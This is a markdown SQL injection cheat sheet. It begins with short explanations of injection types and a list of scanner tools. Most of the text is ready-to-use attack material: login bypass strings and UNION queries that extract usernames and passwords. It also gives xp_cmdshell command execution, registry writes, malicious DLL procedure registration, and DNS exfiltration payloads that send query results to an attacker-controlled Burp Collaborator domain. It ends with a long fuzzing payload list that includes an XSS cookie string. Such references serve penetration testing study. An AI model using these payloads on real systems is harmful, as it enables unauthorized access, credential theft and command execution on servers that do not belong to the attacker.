# SQL Injection Type:
## In-band SQLi (Classic SQLi): 
In-band SQL Injection is the most common and easy-to-exploit of SQL Injection attacks. In-band SQL Injection occurs when an attacker is able to use the same communication channel to both launch the attack and gather results. The two most common types of in-band SQL Injection are Error-based SQLi and Union-based SQLi.

## Error-based SQLi: 
Error-based SQLi is an in-band SQL Injection technique that relies on error messages thrown by the database server to obtain information about the structure of the database. In some cases, error-based SQL injection alone is enough for an attacker to enumerate an entire database.

## Union-based SQLi: 
Union-based SQLi is an in-band SQL injection technique that leverages the UNION SQL operator to combine the results of two or more SELECT statements into a single result which is then returned as part of the HTTP response.

## Inferential SQLi (Blind SQLi): 
Inferential SQL Injection, unlike in-band SQLi, may take longer for an attacker to exploit, however, it is just as dangerous as any other form of SQL Injection. In an inferential SQLi attack, no data is actually transferred via the web application and the attacker would not be able to see the result of an attack in-band (which is why such attacks are commonly referred to as “blind SQL Injection attacks”). Instead, an attacker is able to reconstruct the database structure by sending payloads, observing the web application’s response and the resulting behavior of the database server. The two types of inferential SQL Injection are Blind-boolean-based SQLi and Blind-time-based SQLi.

## Boolean-based (content-based) Blind SQLi: 
Boolean-based SQL Injection is an inferential SQL Injection technique that relies on sending an SQL query to the database which forces the application to return a different result depending on whether the query returns a TRUE or FALSE result. Depending on the result, the content within the HTTP response will change, or remain the same. This allows an attacker to infer if the payload used returned true or false, even though no data from the database is returned.

## Time-based Blind SQLi: 
Time-based SQL Injection is an inferential SQL Injection technique that relies on sending an SQL query to the database which forces the database to wait for a specified amount of time (in seconds) before responding. The response time will indicate to the attacker whether the result of the query is TRUE or FALSE. epending on the result, an HTTP response will be returned with a delay, or returned immediately. This allows an attacker to infer if the payload used returned true or false, even though no data from the database is returned.

## Out-of-band SQLi: 
Out-of-band SQL Injection is not very common, mostly because it depends on features being enabled on the database server being used by the web application. Out-of-band SQL Injection occurs when an attacker is unable to use the same channel to launch the attack and gather results. Out-of-band techniques, offer an attacker an alternative to inferential time-based techniques, especially if the server responses are not very stable (making an inferential time-based attack unreliable).

## Voice Based Sql Injection: 
It is a sql injection attack method that can be applied in applications that provide access to databases with voice command. An attacker could pull information from the database by sending sql queries with sound.


# SQL Injection Vulnerability Scanner Tool’s:
```
SQLMap — Automatic SQL Injection And Database Takeover Tool
jSQL Injection — Java Tool For Automatic SQL Database Injection
BBQSQL — A Blind SQL-Injection Exploitation Tool
NoSQLMap — Automated NoSQL Database Pwnage
Whitewidow — SQL Vulnerability Scanner
DSSS — Damn Small SQLi Scanner
explo — Human And Machine Readable Web Vulnerability Testing Format
Blind-Sql-Bitshifting — Blind SQL-Injection via Bitshifting
Leviathan — Wide Range Mass Audit Toolkit
Blisqy — Exploit Time-based blind-SQL-injection in HTTP-Headers (MySQL/MariaDB)
```


# Test: 
## Any Field
```
'
"
```


## Login
Username: 
```
" or ""="
```
Password:
```
" or ""="
```
Result:
```
SELECT * FROM Users WHERE Name ="" or ""="" AND Pass ="" or ""=""
```
The SQL above is valid and will return all rows from the "Users" table, since OR ""="" is always TRUE.



## Other tests
```
' or 1=1--
' and 1=1--
' or 1=1;--
' and 1=1;--
'OR 1 OR'
105 OR 1=1
```



# SQLi
https://portswigger.net/support/using-burp-to-test-for-the-owasp-top-ten

https://portswigger.net/support/using-burp-to-detect-sql-injection-flaws

https://portswigger.net/web-security/sql-injection

https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/#SyntaxBasicAttacks

### Test: 
| Syntax | Description|
|--------|------------|
| SELECT @@version | Version Info. for Microsoft, MySQL |
| SELECT * FROM v$version | Version Info. for Oracle |
| SELECT version() | Version Info. for PostgreSQL |
| ' UNION SELECT @@version-- | Union Attack To Get Version Info. |
| SELECT * FROM information_schema.tables | Show Tables |
|-- | everything after is a comment|
|' | to test if it will respond to the injection|
|???| Divide by zero to get error message|
|'; waitfor delay('0:0:20')--|use a time delay to verify SQLi works when there is no output|
|admin' -- | login bypass |
|admin' # | login bypass |
|admin'/* | login bypass |
|' OR 1=1--  | login bypass |
|OR 1=1 | login bypass |
|OR 1=2, and | login bypass |
|' or 1=1-- | login bypass |
|' or 1=1# | login bypass |
|' or 1=1/* | login bypass |
|') or '1'='1-- | login bypass |
|') or ('1'='1-- | login bypass |
|a' or 1=1-- | ' for password|
|.... | login bypass |
| ' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--| Login as different user |

### Strings without Quotes
In MySQL easy way to generate hex representations of strings use this; 

| Version | HEX | Results |
|---------|-----|---------|
| MySQL | SELECT CONCAT(CHAR(75),CHAR(76),CHAR(77)) | This will return 'KLM' |
|SQL Server |SELECT CHAR(75)+CHAR(76)+CHAR(77)  | This will return 'KLM' |
| Oracle | SELECT CHR(75)||CHR(76)||CHR(77) | This will return 'KLM' |
| PostgreSQL |SELECT (CHaR(75)||CHaR(76)||CHaR(77)) | This will return 'KLM' |
| MySQL |  SELECT CONCAT('0x',HEX('c:\\boot.ini'))| This will show the content of c:\boot.ini |
| MySQL | SELECT LOAD_FILE(0x633A5C626F6F742E696E69) | This will show the content of c:\boot.ini |
| ALL | '; insert into users values( 1, 'hax0r', 'coolpass', 9 )/* | insert user: haxor with the password: coolpass |
| MySQL | INSERT INTO members(id, user, pass) VALUES(1, ''+SUBSTRING(@@version,1,10) ,10) | |
| SQL Server |  bcp "SELECT * FROM test..foo" queryout c:\inetpub\wwwroot\runcommand.asp -c -Slocalhost -Usa -Pfoobar | Write text file. Login Credentials are required to use this function. |
| SQL Server | EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:' | Executing system commands, xp_cmdshell |
| SQL Server | EXEC master.dbo.xp_cmdshell 'ping ' | Simple ping check (configure your firewall or sniffer to identify request before launch it) |
| SQL Server | master..sysmessages | Error Messages |
| SQL Server | master..sysservers | Linked Services |
|SQL Server 2000 | masters..sysxlogins | Crackable Passwords |
|SQL Server 2005 | sys.sql_logins | Crackable Passwords |
| SQL Server| exec master..xp_cmdshell 'dir' | |
| SQL Server | xp_regaddmultistring | |
| SQL Server | xp_regdeletekey | |
| SQL Server | xp_regdeletevalue | |
| SQL Server | xp_regenumkeys | |
| SQL Server | xp_regenumvalues | |
| SQL Server | xp_regread | |
| SQL Server | xp_regremovemultistring | |
| SQL Server | xp_regwrite  | |
| | exec xp_regread HKEY_LOCAL_MACHINE, 'SYSTEM\CurrentControlSet\Services\lanmanserver\parameters', 'nullsessionshares' | |
| | exec xp_regenumvalues HKEY_LOCAL_MACHINE, 'SYSTEM\CurrentControlSet\Services\snmp\parameters\validcommunities' | |
| SQL Server | xp_servicecontrol | Managing Services |
| SQL Server | xp_loginconfig | Login Mode |
| SQL Server | xp_makecab | Create Cab Files |
| SQL Server | xp_ntsec_enumdomains | Domain Enumeration |
| SQL Server | sp_addextendedproc 'xp_webserver', 'c:\temp\x.dll' | Add new procedure (virtually you can execute whatever you want) |
| |exec xp_webserver | |
| SQL Server | sp_makewebtask | Write text file to a UNC or an internal path |
| SQL Server | ';shutdown -- | |



### Bypassing MD5 Hash Check Example (MSP)
might need to know hash format used for passwords on the site. 
```
Username :admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
Password : 1234
```
81dc9bdb52d04dc20036dbd8313ed055 = MD5(1234)


### Error Based - Find Columns Names
**Finding Column Names with HAVING BY - Error Based (SQL Server):**
In the same order,
- HAVING 1=1 --
- GROUP BY table.columnfromerror1 HAVING 1=1 --
- GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 --
- GROUP BY table.columnfromerror1, columnfromerror2, columnfromerror(n) HAVING 1=1 -- and so on

If you are not getting any more error then it's done.

**Finding how many columns in SELECT query by ORDER BY:**
- ORDER BY 1--
- ORDER BY 2--
- ORDER BY N-- so on

Keep going until get an error. Error means you found the number of selected columns.

## SQL injection in different parts of the query
The most common locations where SQL injection arises are:
- In WHERE clause of a SELECT query
- In UPDATE statements, within the updated values or the WHERE clause.
- In INSERT statements, within the inserted values.
- In SELECT statements, within the table or column name.
- In SELECT statements, within the ORDER BY clause.


## Example Bypass Restriction/ Retrieving Hidden Data: 
in this example the system is automatically adding ```'AND released = 1'``` to the query to prevent customers from seeing unreleased items. 

Web Request: https://insecure-website.com/products?category=Gifts

Becomes: 
```
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```
This SQL query asks the database to return:
- all details (*)
- from the products table
- where the category is Gifts
- and released is 1.

Modified: https://insecure-website.com/products?category=Gifts'--

Becomes: 
```
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```
Modified: https://insecure-website.com/products?category=Gifts'+OR+1=1--

Becomes: 
```
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```
This will bypass the restriction on seeing unreleased items. 

## Example Login/ Subverting Application Logic: 
Normal: 
```
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
```

Hack: by pass the need for a password by using ```administrator'--``` as the user name

Becomes: 
```
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```
this tells it to ignore the password filed and just login as administrator.


## Example Retrieving Data From Other Database Tables:
user searches for gifts
```
SELECT name, description FROM products WHERE category = 'Gifts'
```
Hack: search the following query to get a list of usernames and passwords
```
' UNION SELECT username, password FROM users--
```
Will close the quotes, add instructions to get username and passwords from the table users


## Example Examining The Database
For Oracle: 
```
SELECT * FROM v$version
```

Most Databases: 
```
SELECT * FROM information_schema.tables
```

# String concatenation
You can concatenate together multiple strings to make a single string.

| Language | Syntax |
|----------|--------|
|**Oracle**      |'foo'\|\|'bar'|
|**Microsoft**   |'foo'+'bar'|
|**PostgreSQL**  |'foo'\|\|'bar'|
|**MySQL**	|'foo' 'bar' **[Note the space between the two strings]**|
||CONCAT('foo','bar')|

# Substring
You can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based. Each of the following expressions will return the string ba.

| Language | Syntax |
|----------|--------|
|**Oracle**      |SUBSTR('foobar', 4, 2)|
|**Microsoft**   |SUBSTRING('foobar', 4, 2)|
|**PostgreSQL**  |SUBSTRING('foobar', 4, 2)|
|**MySQL**       |SUBSTRING('foobar', 4, 2)|

# Comments
You can use comments to truncate a query and remove the portion of the original query that follows your input.

| Language | Syntax |
|----------|--------|
|**Oracle**	    |--comment|
|**Microsoft**   |--comment|
|            |/\*comment\*/|
|**PostgreSQL**  |--comment|
|            |/\*comment\*/|
|**MySQL**       |#comment|
|            |-- comment **[Note the space after the double dash]**|
|            |/\*comment\*/|

# Database version
You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.

| Language | Syntax |
|----------|--------|
|**Oracle**      |SELECT banner FROM v$version|
|            |SELECT version FROM v$instance|
|**Microsoft**   |SELECT @@version|
|**PostgreSQL**  |SELECT version()|
|**MySQL**       |SELECT @@version|

# Database contents
You can list the tables that exist in the database, and the columns that those tables contain.

| Language | Syntax |
|----------|--------|
|**Oracle**      |SELECT * FROM all_tables|
|            |SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'|
|**Microsoft**   |SELECT * FROM information_schema.tables|
|            |SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'|
|**PostgreSQL**  |SELECT * FROM information_schema.tables|
|            |SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'|
|**MySQL**       |SELECT * FROM information_schema.tables|
|           |SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'|

# Conditional errors
You can test a single boolean condition and trigger a database error if the condition is true.

| Language | Syntax |
|----------|--------|
|**Oracle**      |SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual|
|**Microsoft**   |SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END|
|**PostgreSQL**  |SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END|
|**MySQL**       |SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')|

# Batched (or stacked) queries
You can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.

| Language | Syntax |
|----------|--------|
|**Oracle**	|**Does not support batched queries.**|
|**Microsoft**	|QUERY-1-HERE; QUERY-2-HERE|
|**PostgreSQL**	|QUERY-1-HERE; QUERY-2-HERE|
|**MySQL**	|**Does not support batched queries.**|

# Time delays
You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.

| Language | Syntax |
|----------|--------|
|**Oracle**	|dbms_pipe.receive_message(('a'),10)|
|**Microsoft**	|WAITFOR DELAY '0:0:10'|
|**PostgreSQL**	|SELECT pg_sleep(10)|
|**MySQL**	|SELECT sleep(10)|

# Conditional time delays
You can test a single boolean condition and trigger a time delay if the condition is true.

| Language | Syntax |
|----------|--------|
|**Oracle**	|SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'\|\|dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual|
|**Microsoft**	|IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'|
|**PostgreSQL**	|SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END|
|**MySQL**	|SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a')|

# DNS lookup
You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use Burp Collaborator client to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.

| Language | Syntax |
|----------|--------|
|**Oracle** |**The following technique leverages an XML external entity (XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:**|
||SELECT extractvalue(xmltype('\<?xml version="1.0" encoding="UTF-8"?\>\<!DOCTYPE root [ \<!ENTITY % remote SYSTEM "http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"\> %remote;]\>'),'/l') FROM dual|
||**The following technique works on fully patched Oracle installations, but requires elevated privileges:**|
||SELECT UTL_INADDR.get_host_address('YOUR-SUBDOMAIN-HERE.burpcollaborator.net')|
|**Microsoft**	|exec master..xp_dirtree '//YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a'|
|**PostgreSQL**	|copy (SELECT '') to program 'nslookup YOUR-SUBDOMAIN-HERE.burpcollaborator.net'|
|**MySQL**	|**The following techniques work on Windows only:**|
||LOAD_FILE('\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a')|
||SELECT ... INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a'|

# DNS lookup with data exfiltration
You can cause the database to perform a DNS lookup to an external domain containing the results of an injected query. To do this, you will need to use Burp Collaborator client to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to retrieve details of any DNS interactions, including the exfiltrated data.

| Language | Syntax |
|----------|--------|
|**Oracle**	|SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?\>\<!DOCTYPE root [ \<!ENTITY % remote SYSTEM "http://'\|\|(SELECT YOUR-QUERY-HERE)\|\|'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"\> %remote;]\>'),'/l') FROM dual|
|**Microsoft**	|declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a"')|
|**PostgreSQL**	|create OR replace function f() returns void as $$|
||declare c text;|
||declare p text;|
||begin|
||SELECT into p (SELECT YOUR-QUERY-HERE);|
||c := 'copy (SELECT '''') to program ''nslookup '\|\|p\|\|'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net''';|
||execute c;|
||END;|
||$$ language plpgsql security definer;|
||SELECT f();|
|**MySQL**	|**The following technique works on Windows only:**|
||SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a'|







```
()"><script>alert(‘document.cookie’)</script>
' or '1'='1'#
" "
" #
" --
""
"&"
"*"
"-"
"/*
"^"
' #
' '
' --
' –
'#
'&'
''
'*'
'-'
'--
'/*
'='
'\"
'^'
,
--
/
/*…*/ 
//
;
=
==
\
\\
`
``
'=0--+
%00
;%00
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
1*56
1′) and '1′='1–
1 AND (SELECT * FROM Users) = 1    
1-false
1' GROUP BY 1,2,--+
1' GROUP BY 1,2,3--+
1 or benchmark(10000000,MD5(1))#
1) or benchmark(10000000,MD5(1))#
1)) or benchmark(10000000,MD5(1))#
1' ORDER BY 1--+
1' ORDER BY 1,2--+
1' ORDER BY 1,2,3--+
1' ORDER BY 2--+
1' ORDER BY 3--+
1 or pg_sleep(5)--
1) or pg_sleep(5)--
1)) or pg_sleep(5)--
1 or sleep(5)#
1) or sleep(5)#
1)) or sleep(5)#
1-true
-1' UNION SELECT 1,2,3--+
-1 UNION SELECT 1 INTO @,@
-1 UNION SELECT 1 INTO @,@,@
-2
%2c(select%20*%20from%20(select(sleep(10)))a)
+
admin" #
admin" --
admin"/*
admin' #
admin' --
admin'/*
admin' and substring(password/text(),1,1)='7
admin' #	login bypass
admin' --	login bypass
admin'/*	login bypass
admin" or "1"="1
admin" or "1"="1"#
admin" or "1"="1"--
admin" or "1"="1"/*
admin" or 1=1
admin" or 1=1#
admin" or 1=1--
admin" or 1=1/*
admin") or "1"="1
admin") or "1"="1"#
admin") or "1"="1"--
admin") or "1"="1"/*
admin") or ("1"="1
admin") or ("1"="1"#
admin") or ("1"="1"--
admin") or ("1"="1"/*
admin' or '1'='1
admin' or '1'='1'#
admin' or '1'='1'--
admin' or '1'='1'/*
admin' or 1=1
admin' or 1=1#
admin' or 1=1--
admin' or 1=1/*
admin') or '1'='1
admin') or '1'='1'#
admin') or '1'='1'--
admin') or '1'='1'/*
admin') or ('1'='1
admin') or ('1'='1'#
admin') or ('1'='1'--
admin') or ('1'='1'/*
admin"or 1=1 or ""="
admin'or 1=1 or ''='
AND 0
AND 1
AND 1=0
AND 1=0#
AND 1=0-- 
AND 1083=1083 AND ('1427=1427
AND 1083=1083 AND (1427=1427
AND 1=0 AND '%'='
" AND 1=0 UNION ALL SELECT "", "81dc9bdb52d04dc20036dbd8313ed055
' AND 1=0 UNION ALL SELECT '', '81dc9bdb52d04dc20036dbd8313ed055
and 1=1
and 1=1–
' and 1='1
AND 1=1
AND 1=1#
AND 1=1-- 
AND 1=1 AND '%'='
' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --
AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
AND 3516=CAST((CHR(113)||CHR(106)||CHR(122)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (3516=3516) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(106)||CHR(107)||CHR(113)) AS NUMERIC)
AND 5650=CONVERT(INT,(SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (5650=5650) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))#
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))-- 
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))#
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))-- 
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))#
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))-- 
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))#
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))-- 
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))#
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))-- 
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))#
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))-- 
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))#
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))-- 
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))#
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))-- 
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))#
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))-- 
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))#
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))-- 
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))#
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))-- 
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))#
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))-- 
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))#
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))-- 
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))
